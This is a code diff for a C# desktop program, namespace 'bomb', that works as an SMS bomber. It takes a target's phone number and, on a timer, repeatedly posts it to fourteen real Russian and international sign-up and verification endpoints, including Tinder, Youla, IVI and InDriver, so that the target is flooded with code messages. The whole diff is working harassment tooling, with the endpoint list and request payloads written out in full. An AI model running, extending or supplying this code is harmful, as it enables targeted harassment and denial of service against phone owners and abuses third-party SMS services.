@@ -23,11 +23,39 @@ namespace bomb
     /// </summary>
     public partial class MainWindow : Window
     {
+        DispatcherTimer timer = new DispatcherTimer();
+        DateTime dt = new DateTime();
+        string[] forSend;
+        int one = 0, two = 0, three = 0;
+        int count = -1;
+        int d = 0;
         public MainWindow()
         {
             InitializeComponent();
             tbCount.IsReadOnly = true;
-            DispatcherTimer timer = new DispatcherTimer();
+            
+            timer.Interval = new TimeSpan(0, 0, 0, 0, 100);
+            timer.Tick += Timer_Tick;
+        }
+
+        private void Timer_Tick(object sender, EventArgs e)
+        {
+            if (count < (14 * 3)-1)
+            {
+                if (d < int.Parse(tbCount.Text) * 14)
+                {
+                    one = ++count;
+                    two = ++count;
+                    three = ++count;
+                    Send(forSend[one], forSend[two], forSend[three]);
+                    d++;
+                }
+                else
+                    timer.Stop();
+            }
+            else
+                count = -1;
+           
         }
 
         private static string Post(string Url, string Data)
@@ -87,26 +115,27 @@ namespace bomb
 
         private void Button_Click_2(object sender, RoutedEventArgs e)
         {
+            count = -1;
+            d = 0;
+            dt = DateTime.Now;
+            timer.Start();
             string phone = tbPhone.Text;
-            for (int i = 0; i < int.Parse(tbCount.Text); i++)
-            {
-                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number=+7{phone}", "Tinder");
-                Send("https://app.karusel.ru/api/v1/phone/", $"phone=8{phone}", "Карусель");
-                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone=7{phone}", "Qlean");
-                Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7{phone}", "AT PRIME");
-                Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{phone}", "Юла");
-                Send($"https://www.citilink.ru/registration/confirm/phone/+ 7{phone}/", $"", "CityLink");
-                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{phone}", "SunLight");
-                Send("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=lkp&login=+7{phone}", "Invitro");
-                Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{phone}&SignupForm[device_type]=3", "DeliMobil");
-                Send("https://api.mtstv.ru/v1/users", $"msisdn=7{phone}", "MTC");
-                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"l={phone}", "Rutaxi");
-                Send("https://www.icq.com/smsreg/requestPhoneValidation.php", $"msisdn=7{phone}&locale=en&countryCode=ru&version=1&k" +
-                    $"=ic1rtwz1s1Hj1O0r&r=46763", "ICQ");
-                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"mode=request&phone=+7{phone}&phone_permission=unknown&stream" +
-                    $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
-                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{phone}", "IVI");
-            }
+            forSend = new string[]{ "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number=+7{phone}","Tinder",
+            "https://app.karusel.ru/api/v1/phone/", $"phone=8{phone}","Карусель",
+            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone=7{phone}", "Qlean",
+            "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7{phone}", "AT PRIME",
+            "https://youla.ru/web-api/auth/request_code", $"phone=+7{phone}", "Юла",
+            $"https://www.citilink.ru/registration/confirm/phone/+ 7{phone}/", $"", "CityLink",
+            "https://api.sunlight.net/v3/customers/authorization/", $"phone=7{phone}", "SunLight",
+            "https://lk.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=lkp&login=+7{phone}","Invitro",
+            "https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{phone}&SignupForm[device_type]=3", "DeliMobil",
+            "https://api.mtstv.ru/v1/users",$"msisdn=7{phone}", "MTC",
+            "https://moscow.rutaxi.ru/ajax_keycode.html", $"l={phone}","Rutaxi",
+            "https://www.icq.com/smsreg/requestPhoneValidation.php", $"msisdn=7{phone}&locale=en&countryCode=ru&version=1&k=ic1rtwz1s1Hj1O0r&r=46763", "ICQ",
+            "https://terra-1.indriverapp.com/api/authorization?locale=ru", $"mode=request&phone=+7{phone}&phone_permission=unknown&stream_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver",
+            "https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{phone}", "IVI"};
+
+            
         }
     }
 }
